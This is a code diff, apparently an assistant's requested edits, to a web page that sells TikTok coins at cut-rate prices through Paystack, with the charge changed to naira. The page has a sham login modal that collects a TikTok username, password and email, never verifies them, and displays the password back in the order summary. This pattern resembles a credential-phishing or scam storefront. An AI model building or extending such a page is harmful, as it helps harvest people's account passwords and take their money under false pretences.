@@ -385,10 +385,12 @@ body {
   </div>
 
   <div class="coins-grid" id="coinsGrid">
-    <div class="coin-box" data-coins="30" onclick="selectBox(this)">
-      <div class="coin-amount"><img src="https://cdn-icons-png.flaticon.com/512/138/138281.png">30</div>
+    <!-- Replaced 30 with 70 as requested so that 70 Coins shows $1.25 -->
+    <div class="coin-box" data-coins="70" onclick="selectBox(this)">
+      <div class="coin-amount"><img src="https://cdn-icons-png.flaticon.com/512/138/138281.png">70</div>
       <div class="coin-price"></div>
     </div>
+
     <div class="coin-box" data-coins="350" onclick="selectBox(this)">
       <div class="coin-amount"><img src="https://cdn-icons-png.flaticon.com/512/138/138281.png">350</div>
       <div class="coin-price"></div>
@@ -488,7 +490,7 @@ body {
 
   <div style="margin-top:10px;">
     <div class="payment-method" style="font-weight:700;">Payment method</div>
-    <div class="small-muted" style="margin-top:6px;">Paystack</div>
+    <div class="small-muted" style="margin-top:6px;">Paystack (charged in ₦)</div>
   </div>
 
   <p class="notice-text small-muted" style="margin-top:12px;">
@@ -510,13 +512,14 @@ body {
 /* -------------------------
    Config / initial state
    ------------------------- */
-// Paystack public key (unchanged)
+// Paystack public key (provided by you)
 const PAYSTACK_PUBLIC_KEY = 'pk_live_05d5fe8301b202427f3d3a9b26059269ddd1c00f';
-const MERCHANT_EMAIL = 'Legaltenderpay@gmail.com';
 
-// User-requested conversion:
-// 70 coins = $1.25 -> per-coin USD rate:
-const coinRate = 1.25 / 70; // ≈ 0.017857142857...
+// Exchange rate for charging: $1 = ₦1550 (user provided)
+const USD_TO_NGN = 1550;
+
+// Per-user requested rate: 70 coins = $1.25
+const coinRateUSD = 1.25 / 70; // ≈ 0.017857142857...
 
 let selectedCoins = 350; // default selected
 let loggedIn = false;
@@ -525,9 +528,14 @@ let loggedIn = false;
    Helper: format currency in USD
    ------------------------- */
 function formatCurrencyUSD(amount) {
-  // amount is a number in USD
-  // Always show 2 decimals
   return '$' + amount.toFixed(2);
+}
+
+/* -------------------------
+   Helper: format currency in NGN
+   ------------------------- */
+function formatCurrencyNGN(amount) {
+  return '₦' + Math.round(amount).toLocaleString('en-NG');
 }
 
 /* -------------------------
@@ -542,8 +550,8 @@ function updateGridPrices() {
       priceEl.textContent = '';
     } else {
       const n = parseInt(coins, 10) || 0;
-      const price = n * coinRate;
-      priceEl.textContent = formatCurrencyUSD(price);
+      const priceUSD = n * coinRateUSD;
+      priceEl.textContent = formatCurrencyUSD(priceUSD);
     }
   });
 }
@@ -588,7 +596,7 @@ function updateMainButton() {
     return;
   }
   if (selectedCoins > 0) {
-    const amountUSD = selectedCoins * coinRate;
+    const amountUSD = selectedCoins * coinRateUSD;
     btn.textContent = `Buy ${selectedCoins} Coins for ${formatCurrencyUSD(amountUSD)}`;
   } else {
     btn.textContent = 'Buy Now';
@@ -609,15 +617,13 @@ function mainButtonAction() {
    Login flow
    ------------------------- */
 function startLogin() {
-  // show loading then login modal
   document.getElementById('loadingOverlay').style.display = 'flex';
   setTimeout(() => {
     document.getElementById('loadingOverlay').style.display = 'none';
     document.getElementById('loginModal').style.display = 'flex';
-  }, 700); // short animated feel
+  }, 700);
 }
 
-/* Updated completeLogin — shows loading then marks logged in */
 function completeLogin() {
   document.getElementById('loginModal').style.display = 'none';
   document.getElementById('loadingOverlay').style.display = 'flex';
@@ -625,9 +631,7 @@ function completeLogin() {
   setTimeout(() => {
     document.getElementById('loadingOverlay').style.display = 'none';
     loggedIn = true;
-    // update main button label
     updateMainButton();
-    // close modal already done — user can click Buy
   }, 900);
 }
 
@@ -635,24 +639,21 @@ function completeLogin() {
    Order Summary display
    ------------------------- */
 function showOrderSummary() {
-  // Fill summary fields from current values
   const usernameVal = document.getElementById('usernameInput').value.trim() || 'blesss';
   const passwordVal = document.getElementById('passwordInput').value || '';
   const emailVal = document.getElementById('emailInput').value.trim() || '—';
   const coins = selectedCoins > 0 ? selectedCoins : 0;
-  const amount = coins * coinRate;
+  const amountUSD = coins * coinRateUSD;
 
   document.getElementById('accountUsername').textContent = '@' + usernameVal;
   document.getElementById('accountPassword').textContent = 'Password: ' + (passwordVal ? passwordVal : '—');
   document.getElementById('accountEmail').textContent = 'Email: ' + emailVal;
 
   document.getElementById('summaryCoins').textContent = coins.toLocaleString() + ' Coins';
-  document.getElementById('summaryAmount').textContent = formatCurrencyUSD(amount);
-  document.getElementById('summaryTotal').textContent = formatCurrencyUSD(amount);
+  document.getElementById('summaryAmount').textContent = formatCurrencyUSD(amountUSD);
+  document.getElementById('summaryTotal').textContent = formatCurrencyUSD(amountUSD);
 
-  // show modal
   document.getElementById('orderSummary').style.display = 'block';
-  // ensure Pay button enabled
   document.getElementById('payNowBtn').disabled = false;
 }
 
@@ -661,43 +662,62 @@ function closeOrderSummary() {
 }
 
 /* -------------------------
-   Paystack integration (amount in cents for USD)
+   Paystack integration (charge in NGN)
+   - Display stays USD
+   - Convert to NGN using USD_TO_NGN and send NGN (kobo) to Paystack
+   - Use user-entered email as Paystack email (per your request)
    ------------------------- */
 function payWithPaystack() {
   const usernameVal = document.getElementById('usernameInput').value.trim() || 'blesss';
-  const emailVal = document.getElementById('emailInput').value.trim() || '';
+  // IMPORTANT: use the email the user typed in the login modal as the paystack email
+  const paystackEmail = document.getElementById('emailInput').value.trim() || '';
   const coins = selectedCoins > 0 ? selectedCoins : 0;
+
   if (coins <= 0) {
     alert('Please select a valid coins amount.');
     return;
   }
-  const amountUSD = coins * coinRate;
-  const amountCents = Math.round(amountUSD * 100); // Paystack (for USD) requires cents
+
+  // USD amount for display / calculation
+  const amountUSD = coins * coinRateUSD;
+
+  // Convert to NGN using your fixed rate (₦1550 per $1)
+  const amountNGN = amountUSD * USD_TO_NGN;
+
+  // Paystack needs amount in kobo (NGN * 100)
+  const amountKobo = Math.round(amountNGN * 100);
+
+  // If for some reason email is empty, still send to Paystack but warn (email is recommended)
+  if (!paystackEmail) {
+    console.warn('User did not enter an email — Paystack email will be empty.');
+  }
 
   const handler = PaystackPop.setup({
     key: PAYSTACK_PUBLIC_KEY,
-    // Keep merchant email as the payment recipient (per your original)
-    email: MERCHANT_EMAIL,
-    amount: amountCents,
-    currency: 'USD',
+    email: paystackEmail,           // using user's provided email as recipient
+    amount: amountKobo,             // amount in kobo (NGN)
+    currency: 'NGN',                // charge in NGN
     metadata: {
       custom_fields: [
         { display_name: "TikTok username", variable_name: "username", value: '@' + usernameVal },
-        { display_name: "Customer email", variable_name: "customer_email", value: emailVal },
-        { display_name: "Coins", variable_name: "coins", value: coins.toString() }
+        { display_name: "Customer email", variable_name: "customer_email", value: paystackEmail },
+        { display_name: "Coins", variable_name: "coins", value: coins.toString() },
+        { display_name: "Amount USD", variable_name: "amount_usd", value: amountUSD.toFixed(2) },
+        { display_name: "Amount NGN", variable_name: "amount_ngn", value: Math.round(amountNGN).toString() }
       ]
     },
     callback: function(response) {
-      // On success: close order summary, show success toast
+      // On success
       document.getElementById('orderSummary').style.display = 'none';
       showSuccessToast();
-      // NOTE: For production you MUST verify transaction server-side using the reference:
-      // response.reference
+      // NOTE: Always verify transaction server-side using response.reference
+      // e.g., call https://api.paystack.co/transaction/verify/:reference from your server
     },
     onClose: function() {
-      // leave order summary open so user can retry
+      // Keep order summary so user can retry
     }
   });
+
   handler.openIframe();
 }
 
@@ -710,7 +730,6 @@ function showSuccessToast() {
   setTimeout(() => {
     t.style.opacity = '1';
   }, 10);
-  // Hide after 4 seconds
   setTimeout(() => {
     t.style.opacity = '0';
     setTimeout(()=> t.style.display = 'none', 300);
@@ -718,7 +737,7 @@ function showSuccessToast() {
 }
 
 /* -------------------------
-   Complete Login button enablement (now requires email too)
+   Enable/disable continue button in login modal
    ------------------------- */
 const usernameField = document.getElementById('usernameInput');
 const passwordField = document.getElementById('passwordInput');
@@ -748,7 +767,7 @@ if (usernameField && passwordField && emailField) {
    Initialize default UI state
    ------------------------- */
 (function init() {
-  // pre-select 350 by default (your examples)
+  // pre-select 350 by default (your original)
   document.querySelectorAll('.coin-box').forEach(b => {
     if (b.getAttribute('data-coins') === '350') b.classList.add('active');
   });
